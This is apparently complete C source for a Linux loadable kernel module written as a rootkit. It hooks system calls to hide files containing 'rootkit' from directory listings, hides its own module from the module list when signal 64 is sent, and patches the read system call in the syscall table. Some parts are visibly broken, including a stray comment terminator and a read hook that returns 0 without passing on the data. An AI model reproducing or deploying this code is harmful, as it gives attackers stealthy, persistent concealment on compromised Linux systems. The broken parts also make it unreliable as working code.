//learned from xcellerator

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/kprobes.h>
#include <linux/dirent.h>

#include "ftrace_helper.h"
#define PREFIX "rootkit"

MODULE_LICENSE("GPL");

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

//for hooking syscalls
static unsigned long * __sys_call_table;
//for hiding this module
static struct list_head *prev_module;
static short hidden = 0;
int err;
long error;


//*********hook sys_read**********
//define a kernel used type
typedef asmlinkage long (*orig_read_t)(unsigned int fd, char __user *buf, size_t count);
orig_read_t orig_read;

asmlinkage int new_read(unsigned int fd, char __user *buf, size_t count)
{
	//int fd = regs->di;
	//char __user *buf = (char *)regs->si;
	//size_t count = regs->dx;
	//NAME_MAX is usually 255: max file length in linux
	char file_name[NAME_MAX]={0};
	//copy pathname to a file_name from userspace
	long error = strncpy_from_user(file_name, buf, NAME_MAX);
	
	if (error > 0)
		printk(KERN_INFO "rootkit: trying to read file with name: %s\n", file_name);
	
	orig_read(fd, buf, count);
	return 0;
}

//*******hide directoiries/files**********

//check whether the file start with our prefix
int start_with(char* filename)
{
	if(strstr(filename, PREFIX))
	{
		//found substring PREFIX in file name
		return 1;
	}
	if(memcmp(PREFIX, filename, strlen(PREFIX)) == 0){
		return 1;
	}
	return 0;
}

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_getdents)(const struct pt_regs *);

static asmlinkage int new_getdents64(const struct pt_regs *regs)
{
	struct linux_dirent64 __user *dirp = (struct linux_dirent64 *)regs->si;
	int r = orig_getdents64(regs);
	//allocate a kernel buffer for the direct struct we wanna copy
	struct linux_dirent64 *kernel_buffer = kzalloc(r, GFP_KERNEL);

	//number of bytes read should be larger than 0
	if ((r <= 0) || (kernel_buffer == NULL)){
		return r;
        }
	//copy number of bytes of directory from userspace to kernel dirent
        error = copy_from_user(kernel_buffer, dirp, r);
        if (error) {
        	kfree(kernel_buffer);
		return r;
        }
        
        //current struct storing the dir entry
	struct linux_dirent64 *curr_entry = NULL;
	//previous entry
	//help to skip the entry we want to hide
	struct linux_dirent64 *prev_entry = NULL;
	//inc by the size of each dir entry
	unsigned long offset = 0;
	//looping dir entries
	while (offset < r)
	{
		curr_entry = (void *)kernel_buffer + offset;
			
		//if we found our entry to hide
        	if ( start_with(curr_entry->d_name) == 1 )
        	{
        		//special case: hide the first entry
			if ( curr_entry == kernel_buffer )
			{
				//dec the bytes read
				r = r - curr_entry->d_reclen;
				//move memory up 
                		memmove(curr_entry, (void *)curr_entry + curr_entry->d_reclen, r);
                		continue;
                	}	
			prev_entry->d_reclen += curr_entry->d_reclen;
		}
		else
		{
			prev_entry = curr_entry;
		}
		offset = offset + curr_entry->d_reclen;
	}
	//copy from kernel buffer to userspace 
	error = copy_to_user(dirp, kernel_buffer, r);
	if (error){
		kfree(kernel_buffer);
		return r;
	}
	//free the buffer address
	kfree(kernel_buffer);
	return r;
}
    
static asmlinkage int new_getdents(const struct pt_regs *regs)
{
	//not in kernel headers anymore
	struct linux_dirent {
		unsigned long d_ino;
		unsigned long d_off;
		unsigned short d_reclen;
		char d_name[];
        };
        struct linux_dirent *dirp = (struct linux_dirent *)regs->si;
        
	int r = orig_getdents(regs);
	//allocate a kernel buffer for the direct struct we wanna copy
	struct linux_dirent64 *kernel_buffer = kzalloc(r, GFP_KERNEL);

	//number of bytes read should be larger than 0
	if ((r <= 0) || (kernel_buffer == NULL)){
		return r;
        }
	//copy number of bytes of directory from userspace to kernel dirent
        error = copy_from_user(kernel_buffer, dirp, r);
        if (error) {
        	kfree(kernel_buffer);
		return r;
        }
        //current struct storing the dir entry
	struct linux_dirent64 *curr_entry = NULL;
	//previous entry
	//help to skip the entry we want to hide
	struct linux_dirent64 *prev_entry = NULL;
	//inc by the size of each dir entry
	unsigned long offset = 0;
	//looping dir entries
	while (offset < r)
	{
		curr_entry = (void *)kernel_buffer + offset;
			
		//if we found our entry to hide
        	if ( start_with(curr_entry->d_name) == 1 )
        	{
        		//special case: hide the first entry
			if ( curr_entry == kernel_buffer )
			{
				//dec the bytes read
				r = r - curr_entry->d_reclen;
				//move memory up 
                		memmove(curr_entry, (void *)curr_entry + curr_entry->d_reclen, r);
                		continue;
                	}	
			prev_entry->d_reclen += curr_entry->d_reclen;
		}
		else
		{
			prev_entry = curr_entry;
		}
		offset = offset + curr_entry->d_reclen;
	}
	//copy from kernel buffer to userspace 
	error = copy_to_user(dirp, kernel_buffer, r);
	if (error){
		kfree(kernel_buffer);
		return r;
	}
	//free the buffer address
	kfree(kernel_buffer);
	return r;
}
    
#ifdef PTREGS_SYSCALL_STUBS

static asmlinkage long (*orig_kill)(const struct pt_regs *);

asmlinkage int new_kill(const struct pt_regs *regs)
{
	void showme(void);
	void hideme(void);

	// pid_t pid = regs->di;
	int sig = regs->si;

	if ( (sig == 64) && (hidden == 0) )
	{
		printk(KERN_INFO "rootkit: hiding rootkit kernel module...\n");
		hideme();
		hidden = 1;
	}
	else if ( (sig == 64) && (hidden == 1) )
	{
		printk(KERN_INFO "rootkit: revealing rootkit kernel module...\n");
		showme();
		hidden = 0;
	}
	else
	{
		return orig_kill(regs);
	}
	return 0;
}
#else

static asmlinkage long (*orig_kill)(pid_t pid, int sig);

static asmlinkage int new_kill(pid_t pid, int sig)
{
	void showme(void);
	void hideme(void);

	if ( (sig == 64) && (hidden == 0) )
	{
		printk(KERN_INFO "rootkit: hiding rootkit kernel module...\n");
		hideme();
		hidden = 1;
	}
	else if ( (sig == 64) && (hidden == 1) )
	{
		printk(KERN_INFO "rootkit: revealing rootkit kernel module...\n");
		showme();
		hidden = 0;
	}
	else
	{
		return orig_kill(pid, sig);
	}
	return 0;
}
#endif


void showme(void)
{
	list_add(&THIS_MODULE->list, prev_module);
}


void hideme(void)
{
	prev_module = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
}


static struct ftrace_hook hooks[] = {
	HOOK("__x64_sys_kill", new_kill, &orig_kill),
	HOOK("__x64_sys_getdents64", new_getdents64, &orig_getdents64),
    	HOOK("__x64_sys_getdents", new_getdents, &orig_getdents),
};

unsigned long lookup_by_name(const char *name){
	struct kprobe kp;
	unsigned long r;
	
	kp.symbol_name = name;
	if (register_kprobe(&kp) < 0) return 0;
	r = (unsigned long) kp.addr;
	unregister_kprobe(&kp);
	return r;
}

static int __init rootkit_init(void)
{
	__sys_call_table = (unsigned long *)lookup_by_name("sys_call_table");
	orig_read = (orig_read_t)__sys_call_table[__NR_read];
	__sys_call_table[__NR_read] = (unsigned long)new_read;
	printk("rootkit: hook read\n");*/
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if(err)
		return err;

	printk(KERN_INFO "rootkit: Loaded >:-)\n");

	return 0;
}

static void __exit rootkit_exit(void)
{
	__sys_call_table[__NR_read] = (unsigned long)orig_read;
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
